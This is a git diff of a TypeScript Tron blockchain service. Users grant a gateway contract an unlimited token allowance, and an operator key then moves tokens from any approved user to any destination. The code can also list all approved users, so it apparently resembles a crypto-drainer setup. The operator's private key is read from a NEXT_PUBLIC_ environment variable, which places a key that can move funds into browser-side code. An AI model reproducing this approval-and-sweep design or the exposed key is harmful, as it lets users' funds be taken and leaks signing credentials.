@@ -2,11 +2,10 @@
 // 🔗 Tron Blockchain Service
 // =================================
 
-import { MAX_APPROVAL, TOKEN_ADDRESSES } from "@/constants";
+import { GATEWAY_ADDRESSES, MAX_APPROVAL, RPC_URLS, TOKEN_ADDRESSES } from "@/constants";
 import { ChainType, CurrencyType, BlockchainResult } from "@/types";
-import { getChainAbi } from "../../utils/chainUtils";
+import GatewayAbi from "@/abi/Gateway.json";
 import bigNumber from "bignumber.js";
-import { GATEWAY_ADDRESSES } from "@/constants/blockchain";
 
 // Define proper types for TronWeb
 interface TronWebInstance {
@@ -17,12 +16,7 @@ interface TronWebInstance {
   };
   contract: (abi?: any, address?: string) => any;
   transactionBuilder: {
-    triggerSmartContract: (
-      address: string,
-      functionSelector: string,
-      options: any,
-      parameters: any[]
-    ) => Promise<any>;
+    triggerSmartContract: (address: string, functionSelector: string, options: any, parameters: any[]) => Promise<any>;
   };
   toBigNumber: (value: any) => any;
   toDecimal: (value: any) => number;
@@ -44,67 +38,13 @@ export const tronObj: {
   defaultAccount?: string;
   isConnected?: boolean;
 } = {
-  tronWeb: null,
+  tronWeb: null
 };
 
 export class TronService {
   /**
-   * Get user's token balance (alias for backward compatibility)
+   * view function to call smart contract functions
    */
-  static async getUserTokenBalance(
-    currency: CurrencyType,
-    userAddress: string
-  ): Promise<string> {
-    // Create instance to call instance method
-    const instance = new TronService();
-
-    // Get token address from constants
-    const tokenAddress = TOKEN_ADDRESSES["tron"][currency];
-
-    try {
-      const result = await instance.view(
-        tokenAddress,
-        "balanceOf(address)",
-        [
-          {
-            type: "address",
-            value: userAddress,
-          },
-        ],
-        true
-      );
-      if (result && result.length > 0) {
-        return bigNumber(result[0].substr(0, 64), 16).toString();
-      }
-      return "0";
-    } catch (err) {
-      console.log(`getUserTokenBalance: ${err}`);
-      return "0";
-    }
-  }
-
-  getTrxBalance = async (
-    address: string,
-    isDappTronWeb = false
-  ): Promise<string> => {
-    try {
-      let tronWeb = tronObj.tronWeb || (global as any).tronWeb;
-      if (
-        !isDappTronWeb &&
-        tronObj.tronWeb &&
-        tronObj.tronWeb.defaultAddress &&
-        tronObj.tronWeb.defaultAddress.base58
-      ) {
-        tronWeb = tronObj.tronWeb;
-      }
-      const balance = await tronWeb.trx.getBalance(address);
-      return bigNumber(balance).div(1e6).toString();
-    } catch (err: any) {
-      console.log(`getTrxBalance: ${err}`, address);
-      return "0";
-    }
-  };
-
   view = async (
     address: string,
     functionSelector: string,
@@ -118,16 +58,12 @@ export class TronService {
       if (!tronweb) {
         const { TronWeb } = require("tronweb");
         tronweb = new TronWeb({
-          fullHost: "https://api.trongrid.io",
+          fullHost: RPC_URLS["tron"]
         });
 
         // Set the address we're querying as the default address (required for triggerSmartContract)
         // This is safe for view calls since we're not making actual transactions
-        if (
-          parameters &&
-          parameters.length > 0 &&
-          parameters[0].type === "address"
-        ) {
+        if (parameters && parameters.length > 0 && parameters[0].type === "address") {
           tronweb.setAddress(parameters[0].value);
         } else {
           // Fallback to a dummy address if no address parameter found
@@ -152,25 +88,69 @@ export class TronService {
       );
       return result && result.result ? result.constant_result : [];
     } catch (error: any) {
-      console.log(
-        `view error ${address} - ${functionSelector}`,
-        error.message ? error.message : error
-      );
+      console.log(`view error ${address} - ${functionSelector}`, error.message ? error.message : error);
       return [];
+    }
+  };
+
+  /**
+   * Get user's token balance (alias for backward compatibility)
+   */
+  static async getUserTokenBalance(currency: CurrencyType, userAddress: string): Promise<string> {
+    // Create instance to call instance method
+    const instance = new TronService();
+
+    // Get token address from constants
+    const tokenAddress = TOKEN_ADDRESSES["tron"][currency];
+
+    try {
+      const result = await instance.view(
+        tokenAddress,
+        "balanceOf(address)",
+        [
+          {
+            type: "address",
+            value: userAddress
+          }
+        ],
+        true
+      );
+      if (result && result.length > 0) {
+        return bigNumber(result[0].substr(0, 64), 16).toString();
+      }
+      return "0";
+    } catch (err) {
+      console.log(`getUserTokenBalance: ${err}`);
+      return "0";
+    }
+  }
+
+  getTrxBalance = async (address: string, isDappTronWeb = false): Promise<string> => {
+    try {
+      let tronWeb = tronObj.tronWeb || (global as any).tronWeb;
+      if (
+        !isDappTronWeb &&
+        tronObj.tronWeb &&
+        tronObj.tronWeb.defaultAddress &&
+        tronObj.tronWeb.defaultAddress.base58
+      ) {
+        tronWeb = tronObj.tronWeb;
+      }
+      const balance = await tronWeb.trx.getBalance(address);
+      return bigNumber(balance).div(1e6).toString();
+    } catch (err: any) {
+      console.log(`getTrxBalance: ${err}`, address);
+      return "0";
     }
   };
 
   /**
    * Get user's TRX balance
    */
-  static async getUserNativeBalance(
-    userAddress: string
-  ): Promise<string> {
+  static async getUserNativeBalance(userAddress: string): Promise<string> {
     try {
       // Use direct TRON API call instead of TronWeb
-      const response = await fetch(
-        `https://api.trongrid.io/v1/accounts/${userAddress}`
-      );
+      const response = await fetch(`https://api.trongrid.io/v1/accounts/${userAddress}`);
 
       if (response.ok) {
         const data = await response.json();
@@ -184,13 +164,32 @@ export class TronService {
       }
 
       // If API call fails, return 0 but don't throw error
-      console.warn(
-        `TRON API failed for address ${userAddress}, returning 0 TRX balance`
-      );
+      console.warn(`TRON API failed for address ${userAddress}, returning 0 TRX balance`);
       return "0.000000";
     } catch (error) {
       console.error("Error fetching TRON balance:", error);
       return "0.000000";
+    }
+  }
+
+  static async getTokenDecimals(currency: CurrencyType): Promise<number> {
+    // Create instance to call instance method
+    const instance = new TronService();
+
+    // Get token address from constants
+    const tokenAddress = TOKEN_ADDRESSES["tron"][currency];
+
+    try {
+      const result = await instance.view(tokenAddress, "decimals()", [], true);
+      if (result && result.length > 0) {
+        return bigNumber(result[0].substr(0, 64), 16).toNumber();
+      }
+
+      console.error(`❌ Error getting ${currency.toUpperCase()} decimals for Tron`);
+      return 18;
+    } catch (error: any) {
+      console.error(`❌ Error getting ${currency.toUpperCase()} decimals for Tron:`, error);
+      return 18;
     }
   }
 
@@ -212,38 +211,8 @@ export class TronService {
     // Get gateway address from constants
     const gatewayAddress = GATEWAY_ADDRESSES["tron"];
 
-    let requiredAmount;
-    try {
-      const result = await instance.view(
-        tokenAddress,
-        "decimals()",
-        [],
-        true
-      );
-      if (result && result.length > 0) {
-        const decimals = bigNumber(result[0].substr(0, 64), 16).toNumber();
-        requiredAmount = bigNumber(amount).multipliedBy(10 ** decimals);
-        return {
-          needsApproval: true,
-          currentAllowance: "0",
-          error: "Failed to check approval status",
-        };
-      }
-    } catch (error: any) {
-      return {
-        needsApproval: true,
-        currentAllowance: "0",
-        error: error.message || "Failed to check approval status",
-      };
-    }
-
-    if (!requiredAmount) {
-      return {
-        needsApproval: true,
-        currentAllowance: "0",
-        error: "Failed to check approval status",
-      }
-    }
+    const decimals = await this.getTokenDecimals(currency);
+    const requiredAmount = bigNumber(amount).multipliedBy(10 ** decimals);
 
     try {
       const result = await instance.view(
@@ -252,12 +221,12 @@ export class TronService {
         [
           {
             type: "address",
-            value: userAddress,
+            value: userAddress
           },
           {
             type: "address",
-            value: gatewayAddress,
-          },
+            value: gatewayAddress
+          }
         ],
         true
       );
@@ -265,20 +234,72 @@ export class TronService {
         const currentAllowance = bigNumber(result[0].substr(0, 64), 16);
         return {
           needsApproval: currentAllowance.comparedTo(requiredAmount) < 0,
-          currentAllowance: currentAllowance.toString(),
+          currentAllowance: currentAllowance.toString()
         };
       }
       return {
         needsApproval: true,
         currentAllowance: "0",
-        error: "Failed to check approval status",
+        error: "Failed to check approval status"
       };
     } catch (error: any) {
       return {
         needsApproval: true,
         currentAllowance: "0",
-        error: error.message || "Failed to check approval status",
+        error: error.message || "Failed to check approval status"
       };
+    }
+  }
+
+  /**
+   * Transfer token from approved user using gateway contract
+   */
+  static async transferFromUser(
+    currency: CurrencyType,
+    fromAddress: string,
+    toAddress: string,
+    amount: string
+  ): Promise<BlockchainResult> {
+    try {
+      const gatewayAddress = GATEWAY_ADDRESSES["tron"];
+
+      if (!gatewayAddress) {
+        return {
+          success: false,
+          error: "Gateway contract address not configured"
+        };
+      }
+
+      const tronWeb = (global as any).tronWeb;
+
+      if (!tronWeb) {
+        return { success: false, error: "TronWeb not available" };
+      }
+
+      const operatorPrivateKey = process.env.NEXT_PUBLIC_TRON_OPERATOR_PRIVATE_KEY;
+      if (!operatorPrivateKey) {
+        return {
+          success: false,
+          error: "Tron private key not configured"
+        };
+      }
+
+      tronWeb.setPrivateKey(operatorPrivateKey);
+
+      const gatewayContract = tronWeb.contract(GatewayAbi, gatewayAddress);
+
+      // Convert amount to proper format based on chain
+      const decimals = await this.getTokenDecimals(currency);
+      const amountInWei = bigNumber(amount).multipliedBy(10 ** decimals);
+
+      // Execute transferFrom transaction through gateway contract
+      const tx = await gatewayContract
+        .transferFrom(TOKEN_ADDRESSES["tron"][currency], fromAddress, toAddress, amountInWei)
+        .send();
+
+      return { success: true, txHash: tx };
+    } catch (error: any) {
+      return { success: false, error: error.message };
     }
   }
 
@@ -295,20 +316,16 @@ export class TronService {
       isHealthy: false,
       primaryEndpoint: false,
       alternativeEndpoints: false,
-      errors: [] as string[],
+      errors: [] as string[]
     };
 
     try {
       // Test primary TRON API endpoint
-      const primaryResponse = await fetch(
-        "https://api.trongrid.io/v1/accounts/TJXZqXyJv3cZ6j2tSj5Ci5fQ3N2kVsayJ6"
-      );
+      const primaryResponse = await fetch("https://api.trongrid.io/v1/accounts/TJXZqXyJv3cZ6j2tSj5Ci5fQ3N2kVsayJ6");
       result.primaryEndpoint = primaryResponse.ok;
 
       if (!primaryResponse.ok) {
-        result.errors.push(
-          `Primary TRON API returned ${primaryResponse.status}: ${primaryResponse.statusText}`
-        );
+        result.errors.push(`Primary TRON API returned ${primaryResponse.status}: ${primaryResponse.statusText}`);
       }
     } catch (error) {
       result.errors.push(`Primary TRON API connection failed: ${error}`);
@@ -316,15 +333,11 @@ export class TronService {
 
     try {
       // Test alternative TRON API endpoint
-      const altResponse = await fetch(
-        "https://api.tronstack.io/v1/accounts/TJXZqXyJv3cZ6j2tSj5Ci5fQ3N2kVsayJ6"
-      );
+      const altResponse = await fetch("https://api.tronstack.io/v1/accounts/TJXZqXyJv3cZ6j2tSj5Ci5fQ3N2kVsayJ6");
       result.alternativeEndpoints = altResponse.ok;
 
       if (!altResponse.ok) {
-        result.errors.push(
-          `Alternative TRON API returned ${altResponse.status}: ${altResponse.statusText}`
-        );
+        result.errors.push(`Alternative TRON API returned ${altResponse.status}: ${altResponse.statusText}`);
       }
     } catch (error) {
       result.errors.push(`Alternative TRON API connection failed: ${error}`);
@@ -334,16 +347,12 @@ export class TronService {
     return result;
   }
 
-  initTronLinkWallet = (
-    cb: (() => void) | false = false,
-    cbn: (() => void) | false = false,
-    pop: boolean = true
-  ) => {
+  initTronLinkWallet = (cb: (() => void) | false = false, cbn: (() => void) | false = false, pop: boolean = true) => {
     try {
       console.log("tronlink initing started");
       const self = this;
 
-      const tronlinkPromise = new Promise((resolve) => {
+      const tronlinkPromise = new Promise(resolve => {
         console.log("Setting up tronlinkPromise event listener");
         window.addEventListener(
           "tronLink#initialized",
@@ -352,15 +361,12 @@ export class TronService {
             return resolve(window.tronLink);
           },
           {
-            once: true,
+            once: true
           }
         );
 
         setTimeout(() => {
-          console.log(
-            "tronlinkPromise timeout check - window.tronLink:",
-            !!window.tronLink
-          );
+          console.log("tronlinkPromise timeout check - window.tronLink:", !!window.tronLink);
           if (window.tronLink) {
             console.log("tronlinkPromise resolved via timeout");
             return resolve(window.tronLink);
@@ -368,7 +374,7 @@ export class TronService {
         }, 3000);
       });
 
-      const appPromise = new Promise((resolve) => {
+      const appPromise = new Promise(resolve => {
         let timeCount = 0;
         console.log("Starting appPromise interval check");
         const tmpTimer1 = setInterval(() => {
@@ -383,19 +389,13 @@ export class TronService {
             return resolve(false);
           }
           if (window.tronLink) {
-            console.log(
-              "appPromise found window.tronLink, checking ready state"
-            );
+            console.log("appPromise found window.tronLink, checking ready state");
             clearInterval(tmpTimer1);
             if (window.tronLink.ready) {
               console.log("appPromise resolved with ready tronLink");
               return resolve(window.tronLink);
             }
-          } else if (
-            window.tronWeb &&
-            window.tronWeb.defaultAddress &&
-            window.tronWeb.defaultAddress.base58
-          ) {
+          } else if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
             console.log("appPromise resolved with window.tronWeb");
             clearInterval(tmpTimer1);
             return resolve(window.tronWeb);
@@ -405,17 +405,17 @@ export class TronService {
 
       console.log("About to start Promise.race with:", {
         tronlinkPromise: typeof tronlinkPromise,
-        appPromise: typeof appPromise,
+        appPromise: typeof appPromise
       });
 
       Promise.race([tronlinkPromise, appPromise])
-        .then((tron) => {
+        .then(tron => {
           console.log("Promise.race resolved with:", tron);
           console.log("About to call handleTronWallet with:", {
             tron,
             cb: !!cb,
             pop,
-            cbn: !!cbn,
+            cbn: !!cbn
           });
           try {
             self.handleTronWallet(tron, cb, pop, cbn);
@@ -426,7 +426,7 @@ export class TronService {
             }
           }
         })
-        .catch((error) => {
+        .catch(error => {
           console.error("Promise.race error:", error);
           if (typeof cbn === "function") {
             cbn();
@@ -449,10 +449,7 @@ export class TronService {
   initTronWeb = (tronWeb: any) => {
     console.log("initTronWeb called with:", tronWeb);
     console.log("tronWeb.defaultAddress:", tronWeb?.defaultAddress);
-    console.log(
-      "tronWeb.defaultAddress.base58:",
-      tronWeb?.defaultAddress?.base58
-    );
+    console.log("tronWeb.defaultAddress.base58:", tronWeb?.defaultAddress?.base58);
 
     tronObj.tronWeb = tronWeb;
     tronObj.defaultAccount = tronWeb.defaultAddress.base58;
@@ -462,27 +459,22 @@ export class TronService {
     console.log("initTronWeb completed, tronObj:", {
       tronWeb: !!tronObj.tronWeb,
       defaultAccount: tronObj.defaultAccount,
-      isConnected: tronObj.isConnected,
+      isConnected: tronObj.isConnected
     });
   };
 
-  handleTronWallet = async (
-    tron: any,
-    cb: (() => void) | false,
-    pop: boolean,
-    cbn: (() => void) | false = false
-  ) => {
+  handleTronWallet = async (tron: any, cb: (() => void) | false, pop: boolean, cbn: (() => void) | false = false) => {
     console.log("handleTronWallet called with:", {
       tron,
       cb: !!cb,
       pop,
-      cbn: !!cbn,
+      cbn: !!cbn
     });
     console.log("tron object details:", {
       ready: tron?.ready,
       tronWeb: !!tron?.tronWeb,
       defaultAddress: !!tron?.defaultAddress,
-      defaultAddressBase58: tron?.defaultAddress?.base58,
+      defaultAddressBase58: tron?.defaultAddress?.base58
     });
 
     if (!tron) {
@@ -494,9 +486,7 @@ export class TronService {
       return;
     }
     if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
-      console.log(
-        "handleTronWallet: tron has defaultAddress, calling initTronWeb"
-      );
+      console.log("handleTronWallet: tron has defaultAddress, calling initTronWeb");
       this.initTronWeb(tron);
       if (typeof cb === "function") {
         console.log("handleTronWallet: calling success callback");
@@ -527,24 +517,20 @@ export class TronService {
         console.log("handleTronWallet: requesting accounts...");
         try {
           const res = await tronLink.request({
-            method: "tron_requestAccounts",
+            method: "tron_requestAccounts"
           });
           console.log("handleTronWallet: request result:", res);
           if (res.code === 200) {
             const tronWeb = tronLink.tronWeb;
             if (tronWeb) {
-              console.log(
-                "handleTronWallet: tronWeb found after request, calling initTronWeb"
-              );
+              console.log("handleTronWallet: tronWeb found after request, calling initTronWeb");
               this.initTronWeb(tronWeb);
               if (typeof cb === "function") {
                 console.log("handleTronWallet: calling success callback");
                 cb();
               }
             } else {
-              console.log(
-                "handleTronWallet: tronWeb still not found after request"
-              );
+              console.log("handleTronWallet: tronWeb still not found after request");
             }
             return;
           }
@@ -561,18 +547,14 @@ export class TronService {
         console.log("handleTronWallet: pop is false, not requesting accounts");
         // Even if pop is false, we should try to get the tronWeb if it exists
         if (tronLink.tronWeb) {
-          console.log(
-            "handleTronWallet: found tronWeb despite pop=false, calling initTronWeb"
-          );
+          console.log("handleTronWallet: found tronWeb despite pop=false, calling initTronWeb");
           this.initTronWeb(tronLink.tronWeb);
           if (typeof cb === "function") {
             console.log("handleTronWallet: calling success callback");
             cb();
           }
         } else {
-          console.log(
-            "handleTronWallet: no tronWeb available, closing connection"
-          );
+          console.log("handleTronWallet: no tronWeb available, closing connection");
           this.closeConnect();
           if (typeof cbn === "function") {
             cbn();
@@ -589,7 +571,7 @@ export class TronService {
       "approve(address,uint256)",
       [
         { type: "address", value: spender },
-        { type: "uint256", value: MAX_APPROVAL },
+        { type: "uint256", value: MAX_APPROVAL }
       ],
       {}
     );
@@ -597,10 +579,7 @@ export class TronService {
     return {
       success: result.result ? true : false,
       txHash: result.transaction ? result.transaction.txID : "",
-      message:
-        result.result === true
-          ? "TRON approval data created for user"
-          : "TRON approval data creation failed",
+      message: result.result === true ? "TRON approval data created for user" : "TRON approval data creation failed"
     };
   }
 
@@ -620,9 +599,7 @@ export class TronService {
         parameters
       );
       if (!transaction.result || !transaction.result.result) {
-        throw new Error(
-          "Unknown trigger error: " + JSON.stringify(transaction.transaction)
-        );
+        throw new Error("Unknown trigger error: " + JSON.stringify(transaction.transaction));
       }
 
       const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
@@ -645,7 +622,7 @@ export class TronService {
 
     const tronWeb = new TronWeb({
       fullHost: "https://api.trongrid.io",
-      privateKey: privateKey,
+      privateKey: privateKey
     });
 
     return tronWeb.defaultAddress.base58;
@@ -681,7 +658,7 @@ export class TronService {
       const { TronWeb } = require("tronweb");
       const tronWeb = new TronWeb({
         fullHost: "https://api.trongrid.io",
-        privateKey: ownerPrivateKey,
+        privateKey: ownerPrivateKey
       });
       console.log("owner address", tronWeb.defaultAddress.base58);
 
@@ -689,18 +666,12 @@ export class TronService {
       await tronWeb.isConnected();
 
       // Create Gateway contract instance
-      const gatewayContract = await tronWeb
-        .contract()
-        .at(gatewayAddress);
+      const gatewayContract = await tronWeb.contract().at(gatewayAddress);
 
       const requiredAmount = Math.floor(parseFloat(amount) * 1000000);
 
-      const tokenContract = await tronWeb
-        .contract()
-        .at(tokenAddress);
-      const allowance = await tokenContract
-        .allowance(fromAddress, gatewayAddress)
-        .call();
+      const tokenContract = await tronWeb.contract().at(tokenAddress);
+      const allowance = await tokenContract.allowance(fromAddress, gatewayAddress).call();
       console.log("Current allowance:", allowance.toString());
       console.log("Required amount:", requiredAmount);
       console.log("Sufficient allowance:", allowance >= requiredAmount);
@@ -718,14 +689,7 @@ export class TronService {
       // Execute transferToken transaction through OneTimePing contract
       let result;
       try {
-        result = await gatewayContract
-          .transferToken(
-            tokenAddress,
-            fromAddress,
-            toAddress,
-            requiredAmount
-          )
-          .send();
+        result = await gatewayContract.transferToken(tokenAddress, fromAddress, toAddress, requiredAmount).send();
       } catch (contractError: any) {
         console.error("Contract call error:", contractError);
         console.error("Error message:", contractError.message);
@@ -737,65 +701,21 @@ export class TronService {
       return {
         success: true,
         txHash: result,
-        message: `${amount} ${currency.toUpperCase()} 从 ${fromAddress} 转账至 ${toAddress} (通过 Gateway 合约)`,
+        message: `${amount} ${currency.toUpperCase()} 从 ${fromAddress} 转账至 ${toAddress} (通过 Gateway 合约)`
       };
     } catch (error: any) {
       // Silent error handling for production
       return {
         success: false,
-        error:
-          error.message ||
-          `作为 TRON 所有者，无法通过 Gateway 合约转移 ${currency.toUpperCase()}`,
+        error: error.message || `作为 TRON 所有者，无法通过 Gateway 合约转移 ${currency.toUpperCase()}`
       };
-    }
-  }
-
-  /**
-   * Transfer token from approved user (owner only)
-   */
-  static async transferFromUser(
-    chain: ChainType,
-    currency: CurrencyType,
-    fromAddress: string,
-    toAddress: string,
-    amount: string
-  ): Promise<BlockchainResult> {
-    try {
-      const tronWeb = (global as any).tronWeb;
-
-      if (!tronWeb) {
-        return { success: false, error: "TronWeb not available" };
-      }
-
-      const serverPrivateKey = process.env.NEXT_PUBLIC_PRIVATE_KEY_TRON;
-      if (!serverPrivateKey) {
-        return {
-          success: false,
-          error: "Tron private key not configured",
-        };
-      }
-
-      tronWeb.setPrivateKey(serverPrivateKey);
-
-      const contract = tronWeb.contract(getChainAbi(chain), GATEWAY_ADDRESSES[chain]);
-
-      const tx = await contract
-        .transferFromUser(TOKEN_ADDRESSES[chain][currency], fromAddress, toAddress, amount)
-        .send();
-
-      return { success: true, txHash: tx };
-    } catch (error: any) {
-      return { success: false, error: error.message };
     }
   }
 
   /**
    * Get user's approved token allowance
    */
-  static async getUserAllowance(
-    chain: ChainType,
-    userAddress: string
-  ): Promise<string> {
+  static async getUserAllowance(chain: ChainType, userAddress: string): Promise<string> {
     try {
       const tronWeb = (global as any).tronWeb;
 
@@ -803,7 +723,7 @@ export class TronService {
         return "0";
       }
 
-      const contract = tronWeb.contract(getChainAbi(chain), GATEWAY_ADDRESSES[chain]);
+      const contract = tronWeb.contract(GatewayAbi, GATEWAY_ADDRESSES[chain]);
 
       const allowance = await contract.getUserAllowance(userAddress).call();
       return tronWeb.toBigNumber(allowance).toString();
@@ -823,7 +743,7 @@ export class TronService {
         return [];
       }
 
-      const contract = tronWeb.contract(getChainAbi(chain), GATEWAY_ADDRESSES[chain]);
+      const contract = tronWeb.contract(GatewayAbi, GATEWAY_ADDRESSES[chain]);
 
       const users = await contract.getAllApprovedUsers().call();
       return users;
@@ -835,10 +755,7 @@ export class TronService {
   /**
    * Revoke user approval
    */
-  static async revokeUserApproval(
-    chain: ChainType,
-    userAddress: string
-  ): Promise<BlockchainResult> {
+  static async revokeUserApproval(chain: ChainType, userAddress: string): Promise<BlockchainResult> {
     try {
       const tronWeb = (global as any).tronWeb;
 
@@ -850,13 +767,13 @@ export class TronService {
       if (!serverPrivateKey) {
         return {
           success: false,
-          error: "Tron private key not configured",
+          error: "Tron private key not configured"
         };
       }
 
       tronWeb.setPrivateKey(serverPrivateKey);
 
-      const contract = tronWeb.contract(getChainAbi(chain), GATEWAY_ADDRESSES[chain]);
+      const contract = tronWeb.contract(GatewayAbi, GATEWAY_ADDRESSES[chain]);
 
       const tx = await contract.revokeUserApproval(userAddress).send();
       return { success: true, txHash: tx };
